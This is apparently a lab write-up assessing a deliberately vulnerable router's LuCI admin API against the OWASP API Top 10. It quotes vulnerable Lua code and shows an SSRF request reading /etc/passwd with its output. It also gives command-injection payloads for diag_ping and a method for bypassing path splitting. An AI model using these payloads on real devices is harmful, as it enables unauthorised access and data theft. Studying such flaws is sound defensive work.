# Introduction
In this section we are analyzing the vulnerabilities present in the internal API of the vulnerable home router. This API is used for administration purposes, and it is accessible from the local network in `http://192.168.2.1:80`.

# API2:2023 Broken Authentication

The authentication mechanism of our API for managing the router detects some key characteristics typical of *inadequate authentication*.

## 1. Vulnerable session management

In the session creation function, there is no rate limiting or protection against brute force attacks:
```lua
local function session_setup(user, pass, allowed_users)

	if util.contains(allowed_users, user) then

		local login = util.ubus("session", "login", {

			username = user,

			password = pass,

			timeout = tonumber(luci.config.sauth.sessiontime)

		})
```

## 2. Weak token generation
```lua
util.ubus("session", "set", {

		ubus_rpc_session = login.ubus_rpc_session,

		values = { token = sys.uniqueid(16) }
})
```

## 3. Insufficient validation

There is no validation of the origin of the CSRF token.

```lua
function test_post_security()

	if http.getenv("REQUEST_METHOD") ~= "POST" then
		http.status(405, "Method Not Allowed")
		http.header("Allow", "POST")
		return false
	end
	
	if http.formvalue("token") ~= context.authtoken then
		http.status(403, "Forbidden")
		luci.template.render("csrftoken")
		return false
	end

	return true
end
```

The session to be returned is also not properly verified:
```lua
local function session_retrieve(sid, allowed_users)

	local sdat = util.ubus("session", "get", { ubus_rpc_session = sid })
	
	  
	
	if type(sdat) == "table" and
		type(sdat.values) == "table" and
		type(sdat.values.token) == "string" and
		(not allowed_users or
		util.contains(allowed_users, sdat.values.username))
	then
		uci:set_session_id(sid)
		return sid, sdat.values
	end
	return nil, nil
end
```

The source IP address is not verified, nor is the token expiration date or the consistency of the User-Agent.

## Lack of current password validation

The code allows the administrator password to be changed **without verifying the current password.** It relies entirely on the authentication that has already been performed to access the administration panel.
```lua
function m.parse(map)
    local v1 = pw1:formvalue("_pass")
    local v2 = pw2:formvalue("_pass")

    if v1 and v2 and #v1 > 0 and #v2 > 0 then
        if v1 == v2 then
            -- VULNERABILITY: Changes the password without verifying the current one
            if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, v1) == 0 then
                m.message = translate("Password successfully changed!")
            else
                m.message = translate("Unknown Error, password not changed!")
            end
        else
            m.message = translate("Given password confirmation did not match, password not changed!")
        end
    end

    Map.parse(map)
end
```

![[iot2_router_password_change.png]]

This vulnerability also matches with [[#API8 2023 Security Misconfiguration]] as it is a design decision of the manufacturer not implementing a security standard control for this function.
# API7:2023 Server Side Request Forgery

The developer left a file for debugging and testing the connection to different points in the system to see if URL evaluations and connections within the same network were working. To do this, they registered the endpoints with `sysauth = false` in the dispatcher (`dispatcher.lua`), outside the authenticated `admin/*` tree, so no authentication is required to use them.

```lua
function index()
	local api_node = entry({"api"}, firstchild(), _("API"), 10)
	api_node.sysauth = false
	
	local v1_node = entry({"api", "v1"}, firstchild(), _("API v1"), 20)
	v1_node.sysauth = false
	
	local check_node = entry({"api", "v1", "check"}, call("check_service"), _("Network Service Check"), 60)
	check_node.sysauth = false
	
	local ping_node = entry({"api", "v1", "ping"}, call("ping_host"), _("Ping Host"), 61)
	ping_node.sysauth = false
	
	local status_node = entry({"api", "v1", "status"}, call("service_status"), _("Service Status"), 62)
	status_node.sysauth = false
	
	local tools_node = entry({"tools"}, firstchild(), _("Tools"), 30)
	tools_node.sysauth = false
	
	local ping_simple = entry({"tools", "ping"}, call("ping_host"), _("Ping Tool"), 70)
	ping_simple.sysauth = false
	
	local check_simple = entry({"tools", "check"}, call("check_service"), _("Network Check"), 71)
	check_simple.sysauth = false
end
```

Furthermore, if we list the installed tools and packages, we can see that *curl* was left installed during the development phase, most likely to carry out these tests.

Using this entry, we can see that the server receives requests and reports results:

```shell
❯ curl -X GET "http://192.168.2.1/cgi-bin/luci/api/v1/check?url=file:///etc/passwd"
{"vulnerability":"SSRF_WITHOUT_AUTH","requester":"192.168.1.2","timestamp":1750736334,"status":"success","url":"file:\/\/\/etc\/passwd","headers":[],"response":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root:x:0:0:root:\/root:\/bin\/ash\nntp:x:123:123:ntp:\/var\/run\/ntp:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\nlogd:x:514:514:logd:\/var\/run\/logd:\/bin\/false\nubus:x:81:81:ubus:\/var\/run\/ubus:\/bin\/false\nnetwork:x:101:101:network:\/var\/run\/network:\/bin\/false\nopenwrtuser:x:1000:1000:root:\/root:\/bin\/ash\nanonymous:x:1001:1001::\/tmp\/ftp:\/bin\/ash\nnobody:x:1002:1002::\/var:\/bin\/false\n\r100   390  100   390    0     0   455k      0 --:--:-- --:--:-- --:--:--  380k\n"}%
```

In this case, it is reported that the user has successfully discovered the vulnerability.
The command injection reachable through this SSRF is documented as OS command injection under [[#API8 2023 Security Misconfiguration]], since the two form a chain: SSRF for access, command injection for code execution.
# API8:2023 Security Misconfiguration

## OS Command Injection in Network Diagnostics (RCE)

The *Network > Diagnostics* page runs *ping*, *traceroute* and *nslookup*. The handler `diag_ping` is defined in `controller/admin/network.lua` (not in `network_tools.lua`) and is registered with `call()`, so it accepts both GET and POST:
```lua
138: page = entry({"admin", "network", "diag_ping"}, call("diag_ping"), nil)
```

![[api8_diag_ping.png]]

`diag_ping` passes the user-supplied address straight into a shell through `diag_command`, with input validation and `shellquote` both commented out:
```lua
local util = io.popen(string.format("ping -c 5 -W 1 %s", addr))
```

Every character reaches the shell, so an address such as `192.168.2.1; id` runs an arbitrary command after the ping. Reaching this handler still needs the *sysauth* cookie. The unauthenticated tool routes in *network_tools.lua* (`tools/ping`, `api/v1/ping`) do not help here because they apply a character filter, so the clean injection is the unfiltered `diag_ping`, which the SSRF primitive above is used to reach.

![[api7_discovering_command_injection.png]]

One exploitation caveat: the front-end sends the address as a URL path segment (`/admin/network/diag_ping/<addr>`), and the LuCI dispatcher splits the path on `/`. A payload like `cat /etc/passwd` is cut at the first `/`, so `diag_ping` receives only `192.168.2.1; cat ` and `cat`, left without a filename, reads standard input (the POST body carrying the CSRF token) instead of a file. This is a routing artefact, not input filtering. `diag_command` performs no validation at all. Sending the payload in the request body as `host=192.168.2.1; cat /etc/passwd` avoids the split, because `diag_ping` falls back to `formvalue("host")`.

![[api7_rce_command_injection.png]]

This Remote Code Execution opens the door to local file disclosure, file upload and reverse shells.

**OWASP mapping.** This is OS command injection (CWE-78), not SSRF (CWE-918). In the OWASP API Security Top 10 2023 injection is no longer a standalone entry (it was *API8:2019 Injection*) and now sits under **API8:2023 Security Misconfiguration**. Treat it as a chain: **API7 SSRF (access) -> API8 command injection (RCE)**.
